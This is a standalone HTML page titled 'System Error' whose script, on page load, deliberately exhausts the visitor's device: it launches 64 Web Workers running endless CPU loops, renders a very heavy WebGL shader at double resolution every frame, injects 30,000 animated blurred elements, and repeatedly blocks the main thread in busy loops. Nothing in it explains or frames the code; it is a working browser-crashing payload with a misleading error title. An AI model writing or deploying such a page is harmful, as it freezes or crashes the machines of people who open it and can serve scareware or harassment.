<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Error</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            overflow: hidden;
        }
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }
        #p {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            pointer-events: none;
        }
        .x {
            position: absolute;
            width: 4px;
            height: 4px;
            background: #fff;
            border-radius: 50%;
            box-shadow: 0 0 20px #fff, 0 0 40px #f0f, 0 0 60px #0ff;
            backdrop-filter: blur(2px);
            mix-blend-mode: exclusion;
            will-change: transform;
            animation: c 0.1s infinite linear;
        }
        @keyframes c {
            0% { transform: translate(0, 0) scale(1) rotate(0deg); filter: hue-rotate(0deg); }
            50% { transform: translate(10px, -10px) scale(2) rotate(180deg); filter: hue-rotate(180deg); }
            100% { transform: translate(-10px, 10px) scale(1) rotate(360deg); filter: hue-rotate(360deg); }
        }
    </style>
</head>
<body>
    <canvas id="g"></canvas>
    <div id="p"></div>

    <script>
        window.onload = () => {
            setTimeout(w, 10);
            setTimeout(g, 20);
            setTimeout(d, 30);
            setTimeout(f, 50);
        };

        function w() {
            const c = `function b(){while(true){for(let i=0;i<1e6;i++){Math.sqrt(Math.random());}}}b();`;
            const bl = new Blob([c], { type: 'application/javascript' });
            const u = URL.createObjectURL(bl);
            for (let i = 0; i < 64; i++) {
                try { new Worker(u); } catch(e) {}
            }
        }

        function g() {
            const c = document.getElementById('g');
            c.width = window.innerWidth * 2; 
            c.height = window.innerHeight * 2;
            const gl = c.getContext('webgl2') || c.getContext('webgl');
            if (!gl) return;

            const vs = `attribute vec4 p; void main() { gl_Position = p; }`;
            const fs = `
                precision highp float; uniform float t; uniform vec2 r;
                void main() {
                    vec2 u = gl_FragCoord.xy / r.xy; vec2 z = u * 2.0 - 1.0;
                    vec2 c = vec2(sin(t * 0.1), cos(t * 0.1)) * 1.5; float iter = 0.0;
                    for(int i = 0; i < 5000; i++) {
                        float x = (z.x * z.x - z.y * z.y) + c.x * sin(z.y);
                        float y = (2.0 * z.x * z.y) + c.y * cos(z.x);
                        if((x * x + y * y) > 10.0) break;
                        z.x = x; z.y = y; iter++;
                    }
                    gl_FragColor = vec4(iter / 5000.0, 0.0, 0.0, 1.0);
                }
            `;

            function cs(gl, type, src) {
                const s = gl.createShader(type);
                gl.shaderSource(s, src);
                gl.compileShader(s);
                return s;
            }

            const pr = gl.createProgram();
            gl.attachShader(pr, cs(gl, gl.VERTEX_SHADER, vs));
            gl.attachShader(pr, cs(gl, gl.FRAGMENT_SHADER, fs));
            gl.linkProgram(pr);
            gl.useProgram(pr);

            const b = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, b);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,1,-1,-1,1,1,1,-1]), gl.STATIC_DRAW);
            const pa = gl.getAttribLocation(pr, 'p');
            gl.enableVertexAttribArray(pa);
            gl.vertexAttribPointer(pa, 2, gl.FLOAT, false, 0, 0);

            const tl = gl.getUniformLocation(pr, 't');
            const rl = gl.getUniformLocation(pr, 'r');

            function r(time) {
                gl.uniform1f(tl, time * 0.001);
                gl.uniform2f(rl, c.width, c.height);
                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                requestAnimationFrame(r);
            }
            requestAnimationFrame(r);
        }

        function d() {
            const c = document.getElementById('p');
            const fr = document.createDocumentFragment();
            for (let i = 0; i < 30000; i++) {
                const div = document.createElement('div');
                div.className = 'x';
                div.style.left = Math.random() * 100 + 'vw';
                div.style.top = Math.random() * 100 + 'vh';
                div.style.animationDelay = `${Math.random() * -5}s`;
                div.style.animationDuration = `${0.05 + Math.random() * 0.2}s`;
                fr.appendChild(div);
            }
            c.appendChild(fr);
        }

        function f() {
            function b() {
                const s = Date.now();
                while (Date.now() - s < 3000) { Math.random(); }
                setTimeout(b, 0);
            }
            b();
        }
    </script>
</body>
</html>
